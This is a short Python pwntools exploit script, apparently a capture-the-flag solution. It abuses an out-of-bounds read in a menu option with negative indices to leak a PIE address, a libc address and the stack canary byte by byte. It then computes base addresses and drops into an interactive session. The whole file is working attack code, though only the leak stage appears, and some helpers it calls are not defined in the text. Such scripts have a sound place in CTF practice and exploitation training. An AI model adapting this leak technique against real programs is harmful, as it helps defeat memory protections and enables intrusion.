def init():
    global io

    io = start()


def leak():
    pie = b""
    libc_leak = b""
    canary = b""

    for idx in range(-38, -38 + 8):
        io.sendline(b"2")
        io.sendlineafter(b":", str(idx).encode())
        io.recvuntil(b"char: ")
        pie += io.recv(1)
    
    for idx in range(-70, -70 + 8):
        io.sendline(b"2")
        io.sendlineafter(b":", str(idx).encode())
        io.recvuntil(b"char: ")
        libc_leak += io.recv(1)

    for idx in range(-8869, -8869 + 8):
        io.sendline(b"2")
        io.sendlineafter(b":", str(idx).encode())
        io.recvuntil(b"char: ")
        canary += io.recv(1)
    
    exe.address = u64(pie) - 0x14bc
    libc.address = u64(libc_leak) - 0x8dd96

    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)
    info("stack canary: %#x", u64(canary))


def solve():

    leak()


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()